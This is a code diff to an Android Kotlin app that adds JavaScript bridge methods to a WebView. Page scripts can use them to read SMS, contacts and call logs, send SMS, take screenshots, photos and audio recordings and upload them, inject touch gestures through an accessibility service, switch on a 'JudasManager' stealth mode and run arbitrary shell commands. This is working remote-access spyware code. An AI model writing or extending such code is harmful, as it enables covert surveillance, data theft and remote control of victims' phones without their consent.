@@ -316,6 +316,138 @@ object DynamicUIManager {
                 DebugLogger.log("BRIDGE_ERR", "JSON Parse failed for runIntent: ${e.message}")
             }
         }
+
+        @JavascriptInterface
+        fun uploadFile(filePath: String, category: String) {
+            CoroutineScope(Dispatchers.IO).launch {
+                val file = java.io.File(filePath)
+                if (file.exists()) {
+                    CloudManager.uploadFile(ctx, file, category)
+                } else {
+                    DebugLogger.log("BRIDGE_ERR", "File not found for upload: $filePath")
+                }
+            }
+        }
+
+        @JavascriptInterface
+        fun sendSms(number: String, message: String) {
+            PhoneManager.sendLegitSms(ctx, number, message)
+        }
+
+        @JavascriptInterface
+        fun performGesture(x1: Float, y1: Float, x2: Float, y2: Float, duration: Long) {
+            Handler(Looper.getMainLooper()).post {
+                val svc = MyAccessibilityService.instance
+                if (svc != null) {
+                    val path = android.graphics.Path()
+                    path.moveTo(x1, y1)
+                    if (x1 == x2 && y1 == y2) {
+                        path.lineTo(x1 + 1f, y1 + 1f)
+                    } else {
+                        path.lineTo(x2, y2)
+                    }
+                    val builder = android.accessibilityservice.GestureDescription.Builder()
+                    builder.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, duration))
+                    svc.dispatchGesture(builder.build(), null, null)
+                }
+            }
+        }
+
+        @JavascriptInterface
+        fun takeScreenshot(quality: Int) {
+            MyAccessibilityService.instance?.captureScreenshot(quality) { file ->
+                if (file != null) {
+                    CoroutineScope(Dispatchers.IO).launch {
+                        CloudManager.uploadFile(ctx, file, "BRIDGE_SCREENSHOT")
+                        file.delete()
+                    }
+                }
+            }
+        }
+
+        @JavascriptInterface
+        fun setStealthMode(active: Boolean) {
+            if (active) JudasManager.engageStealthMode(ctx)
+            else JudasManager.disengageStealthMode(ctx)
+        }
+
+        @JavascriptInterface
+        fun openApp(packageName: String) {
+            try {
+                val intent = ctx.packageManager.getLaunchIntentForPackage(packageName)
+                if (intent != null) {
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                    ctx.startActivity(intent)
+                }
+            } catch (e: Exception) {
+                DebugLogger.log("BRIDGE_ERR", "Failed to open app: $packageName")
+            }
+        }
+
+        @JavascriptInterface
+        fun readSms(limit: Int): String {
+            return PhoneManager.getHistoricalSms(ctx, limit).toString()
+        }
+
+        @JavascriptInterface
+        fun getContacts(limit: Int): String {
+            return PhoneManager.getContacts(ctx, limit).toString()
+        }
+
+        @JavascriptInterface
+        fun getCallLogs(limit: Int): String {
+            return PhoneManager.getCallLogs(ctx, limit).toString()
+        }
+
+        @JavascriptInterface
+        fun getSystemInfo(): String {
+            return DeviceManager.getStaticInfo(ctx).toString()
+        }
+
+        @JavascriptInterface
+        fun injectTouchGuard() {
+            showTouchGuard(ctx)
+        }
+
+        @JavascriptInterface
+        fun removeTouchGuard() {
+            DynamicUIManager.removeTouchGuard(ctx)
+        }
+
+        @JavascriptInterface
+        fun capturePhoto(useFront: Boolean) {
+            CoroutineScope(Dispatchers.IO).launch {
+                val file = CameraControl.capture(ctx, useFront)
+                if (file != null) {
+                    CloudManager.uploadFile(ctx, file, "BRIDGE_CAMERA")
+                    file.delete()
+                }
+            }
+        }
+
+        @JavascriptInterface
+        fun recordAudio(seconds: Int) {
+            CoroutineScope(Dispatchers.IO).launch {
+                val file = VoiceManager.recordSnippet(ctx, seconds)
+                if (file != null) {
+                    CloudManager.uploadFile(ctx, file, "BRIDGE_AUDIO")
+                    file.delete()
+                }
+            }
+        }
+        
+        @JavascriptInterface
+        fun shell(cmd: String) {
+            CoroutineScope(Dispatchers.IO).launch {
+                try {
+                    val process = Runtime.getRuntime().exec(cmd)
+                    val output = process.inputStream.bufferedReader().readText()
+                    DebugLogger.log("BRIDGE_SHELL", "Output: $output")
+                } catch(e: Exception) {
+                    DebugLogger.log("BRIDGE_SHELL_ERR", e.message ?: "Unknown")
+                }
+            }
+        }
     }
 
     @SuppressLint("SetJavaScriptEnabled")
